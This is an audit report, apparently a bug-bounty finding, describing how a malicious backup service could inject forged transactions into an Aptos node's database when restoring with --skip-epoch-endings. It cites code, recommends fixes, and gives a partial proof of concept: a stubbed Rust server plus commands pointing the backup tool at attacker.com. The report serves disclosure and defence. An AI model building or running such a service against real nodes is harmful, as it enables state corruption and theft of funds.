# Audit Report

## Title
Backup Service Response Validation Bypass Allows State Corruption via Malicious Transaction Data

## Summary
The transaction backup client in `backup.rs` accepts transaction data and cryptographic proofs from a backup service without any validation during the backup phase. When combined with the `--skip-epoch-endings` flag during restoration, this allows a malicious backup service to inject fabricated transactions with forged proofs into the blockchain database, violating state consistency and consensus safety invariants.

## Finding Description

The vulnerability exists across two phases of the backup/restore flow:

**Phase 1 - Backup (No Validation):**

The `TransactionBackupController::run_impl` method retrieves transactions from a backup service without performing any cryptographic validation: [1](#0-0) 

The backup client simply counts the number of transactions received but never verifies that:
- Transactions correspond to the requested version range
- Transaction hashes match their claimed versions  
- Cryptographic proofs are authentic [2](#0-1) 

Both the transactions AND their proofs come from the same untrusted source and are stored without validation: [3](#0-2) 

**Phase 2 - Restore (Conditional Validation Bypass):**

During restoration, the `LoadedChunk::load` method conditionally verifies the ledger info's BLS signatures: [4](#0-3) 

When `epoch_history` is `None`, the BLS signature verification is skipped. This occurs when the `--skip-epoch-endings` CLI flag is used: [5](#0-4) [6](#0-5) 

The subsequent proof verification at line 167 only checks internal consistency (transaction hashes match the Merkle tree proof) but does NOT verify that the `LedgerInfoWithSignatures` contains valid BLS signatures from real validators: [7](#0-6) 

**Attack Scenario:**

1. Attacker operates a malicious backup service endpoint
2. Victim configures backup client with `--backup-service-address` pointing to attacker's service
3. Attacker's service returns:
   - Fabricated transactions (from wrong versions or completely fake)
   - Matching `TransactionAccumulatorRangeProof` with internally consistent Merkle tree
   - `LedgerInfoWithSignatures` with INVALID/FORGED BLS signatures (not signed by real validators)
4. Backup client stores both without validation
5. Victim later restores using `--skip-epoch-endings` flag
6. Fake transactions pass all verification checks because:
   - Transaction hashes match the proof (attacker made them consistent)
   - Merkle tree proofs are valid (attacker constructed matching tree)
   - BLS signature validation is SKIPPED (epoch_history is None)
7. Fabricated transactions are committed to the database, corrupting blockchain state

This breaks multiple critical invariants:
- **State Consistency**: Arbitrary state corruption from fake transactions
- **Cryptographic Correctness**: BLS signatures bypassed completely
- **Deterministic Execution**: Different nodes restoring from different backup sources could have divergent states
- **Consensus Safety**: Could enable chain forks if validators restore corrupted data

## Impact Explanation

**Critical Severity** - This vulnerability meets the Critical Severity criteria per the Aptos Bug Bounty program:

1. **Consensus/Safety Violations**: If validators restore from malicious backups, they will have corrupted state, leading to consensus failures and potential chain splits.

2. **State Consistency Breach**: Fake transactions can manipulate account balances, resource states, and smart contract data, violating the fundamental guarantee that state transitions are verifiable and authentic.

3. **Loss of Funds**: Attackers could craft transactions that mint tokens, transfer assets, or modify staking balances, directly causing financial loss.

The impact is **non-recoverable** without manual intervention or a hardfork, as the corrupted state would be permanently written to the database and the node would operate on falsified blockchain history.

## Likelihood Explanation

**Medium Likelihood** with the following prerequisites:

1. **Victim uses attacker-controlled backup service** - While this requires user error or social engineering, it is plausible in scenarios where:
   - Users configure backup endpoints from untrusted sources
   - Attackers compromise DNS or perform MITM attacks
   - Internal infrastructure uses shared backup services

2. **Victim uses `--skip-epoch-endings` flag during restore** - This is explicitly documented as "used for debugging," which reduces likelihood. However:
   - Users may use this flag for performance reasons or convenience
   - Automated scripts might enable it without full understanding
   - The code does not prevent production usage
   
3. **No alternative validation** - The system provides no defense-in-depth mechanisms to detect corrupted backups before database corruption occurs.

While likelihood is reduced by the debug flag requirement, the **catastrophic impact** of state corruption justifies Critical severity classification.

## Recommendation

Implement defense-in-depth validation at multiple layers:

**1. Validate During Backup Phase:**

Add cryptographic verification in `TransactionBackupController::run_impl` immediately after receiving transactions:

```rust
// After line 83, before storing:
let mut transactions_file = self
    .client
    .get_transactions(self.start_version, self.num_transactions)
    .await?;

// Get proof and ledger info first
let (range_proof, ledger_info) = self
    .client
    .get_transaction_range_proof_with_ledger_info(
        self.start_version, 
        self.start_version + self.num_transactions - 1
    )
    .await?;

// Verify ledger info has valid BLS signatures from known validator set
if let Some(epoch_history) = &self.epoch_history {
    epoch_history.verify_ledger_info(&ledger_info)?;
} else {
    // Require trusted waypoint or genesis verification
    bail!("Cannot backup without epoch history for validation");
}

// Then verify transactions against validated ledger info as they arrive
```

**2. Make Epoch History Mandatory:**

Remove the `--skip-epoch-endings` flag or make it only available in explicit debug builds:

```rust
// In RestoreCoordinatorOpt, change:
#[cfg(debug_assertions)]
#[clap(long, help = "Skip restoring epoch ending info (DEBUG ONLY).")]
pub skip_epoch_endings: bool,
```

**3. Add Backup Integrity Metadata:**

Store a cryptographic hash of the backup contents signed by the backup operator, allowing detection of tampering before restoration begins.

**4. Implement Backup Verification Mode:**

Add a `--verify-backup` command that validates backup integrity without actually restoring, using trusted epoch history.

## Proof of Concept

**Malicious Backup Service (Rust):**

```rust
use warp::Filter;
use aptos_types::transaction::{Transaction, TransactionInfo, Version};

#[tokio::main]
async fn main() {
    // Malicious backup service that returns fake transactions
    let transactions = warp::path!("transactions" / Version / usize)
        .map(|start_version: Version, num_transactions: usize| {
            // Create fake transactions for ANY requested version range
            let mut fake_data = Vec::new();
            
            for i in 0..num_transactions {
                // Fabricate transaction (e.g., fake coin minting)
                let fake_txn = create_malicious_transaction(start_version + i as u64);
                let fake_txn_info = create_matching_transaction_info(&fake_txn);
                
                // Serialize and prefix with length
                let serialized = bcs::to_bytes(&(fake_txn, fake_txn_info, vec![], vec![])).unwrap();
                fake_data.extend(&(serialized.len() as u32).to_be_bytes());
                fake_data.extend(serialized);
            }
            
            warp::reply::with_header(fake_data, "Content-Type", "application/octet-stream")
        });
    
    let transaction_proof = warp::path!("transaction_range_proof" / Version / Version)
        .map(|first: Version, last: Version| {
            // Return fake proof with FORGED BLS signatures
            let fake_proof = create_fake_proof_with_forged_signatures(first, last);
            let serialized = bcs::to_bytes(&fake_proof).unwrap();
            warp::reply::with_header(serialized, "Content-Type", "application/octet-stream")
        });
    
    warp::serve(transactions.or(transaction_proof))
        .run(([127, 0, 0, 1], 6186))
        .await;
}

fn create_malicious_transaction(version: Version) -> Transaction {
    // Craft transaction that mints tokens or manipulates state
    // Details omitted - would create valid Transaction structure with malicious payload
    unimplemented!()
}
```

**Exploitation Steps:**

```bash
# 1. Start malicious backup service
cargo run --bin malicious-backup-service

# 2. Victim performs backup pointing to attacker
aptos-db-tool backup \
    --backup-service-address http://attacker.com:6186 \
    --start-version 0 \
    --num-transactions 10000 \
    --target-db-dir /var/backup/

# 3. Victim restores with --skip-epoch-endings
aptos-db-tool restore \
    --skip-epoch-endings \
    --target-version 10000 \
    --target-db-dir /var/db/aptos

# 4. Fake transactions are now in the database with corrupted state
# No validation prevented this attack!
```

The malicious transactions will be permanently committed to the database, corrupting the blockchain state with fabricated history.

**Notes:**
- The vulnerability requires TWO security failures: (1) untrusted backup service, and (2) using debug flag `--skip-epoch-endings`
- Even without the debug flag, the lack of validation during backup enables DoS attacks by creating corrupt backups that fail during restoration
- The root cause is insufficient defense-in-depth: the system assumes backup services are trusted without providing cryptographic verification mechanisms
- This violates the principle that external data sources should never be trusted without validation, especially for consensus-critical blockchain operations

### Citations

**File:** storage/backup/backup-cli/src/backup_types/transaction/backup.rs (L80-84)
```rust
        let mut transactions_file = self
            .client
            .get_transactions(self.start_version, self.num_transactions)
            .await?;
        let mut current_ver: u64 = self.start_version;
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/backup.rs (L109-114)
```rust
        ensure!(
            current_ver == expected_next_version,
            "Server did not return all transactions requested. Expecting last version {}, got {}",
            expected_next_version,
            current_ver,
        );
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/backup.rs (L156-171)
```rust
        let (proof_handle, mut proof_file) = self
            .storage
            .create_for_write(
                backup_handle,
                &Self::chunk_proof_name(first_version, last_version),
            )
            .await?;
        tokio::io::copy(
            &mut self
                .client
                .get_transaction_range_proof(first_version, last_version)
                .await?,
            &mut proof_file,
        )
        .await?;
        proof_file.shutdown().await?;
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L147-154)
```rust
        let (range_proof, ledger_info) = storage
            .load_bcs_file::<(TransactionAccumulatorRangeProof, LedgerInfoWithSignatures)>(
                &manifest.proof,
            )
            .await?;
        if let Some(epoch_history) = epoch_history {
            epoch_history.verify_ledger_info(&ledger_info)?;
        }
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L156-167)
```rust
        // make a `TransactionListWithProof` to reuse its verification code.
        let txn_list_with_proof =
            TransactionListWithProofV2::new(TransactionListWithAuxiliaryInfos::new(
                TransactionListWithProof::new(
                    txns,
                    Some(event_vecs),
                    Some(manifest.first_version),
                    TransactionInfoListWithProof::new(range_proof, txn_infos),
                ),
                persisted_aux_info,
            ));
        txn_list_with_proof.verify(ledger_info.ledger_info(), Some(manifest.first_version))?;
```

**File:** storage/backup/backup-cli/src/coordinators/restore.rs (L42-43)
```rust
    #[clap(long, help = "Skip restoring epoch ending info, used for debugging.")]
    pub skip_epoch_endings: bool,
```

**File:** storage/backup/backup-cli/src/coordinators/restore.rs (L219-231)
```rust
        let epoch_history = if !self.skip_epoch_endings {
            Some(Arc::new(
                EpochHistoryRestoreController::new(
                    epoch_handles,
                    self.global_opt.clone(),
                    self.storage.clone(),
                )
                .run()
                .await?,
            ))
        } else {
            None
        };
```
